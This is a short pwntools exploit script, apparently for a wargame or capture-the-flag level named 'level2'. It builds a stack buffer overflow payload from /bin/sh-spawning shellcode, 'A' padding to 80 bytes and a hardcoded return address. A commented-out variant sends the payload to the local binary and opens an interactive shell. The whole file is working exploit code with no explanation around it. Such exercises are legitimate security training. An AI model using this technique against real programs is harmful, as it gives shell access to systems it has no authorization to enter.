import pwn


shellcode = pwn.asm(pwn.shellcraft.sh())
s_len = len(shellcode)

# adress 0x0804a008 
adress = b"\x08\xa0\x04\x08"


payload = shellcode + b'A'* (80 - s_len) + adress

print(payload)

# from pwn import *
#
# p = process('./level2')
#
# shellcode = asm(shellcraft.sh())
# s_len = len(shellcode)
#
# # address = '0x0804a008'
# address = b"\x08\xa0\x04\x08"
#
# payload = shellcode + b'A' * (80 - s_len) + address
#
# print("FAIRYTAIL:")
# print(payload)
# print("MAEL")
#
# p.sendline(payload)
#
# p.interactive()
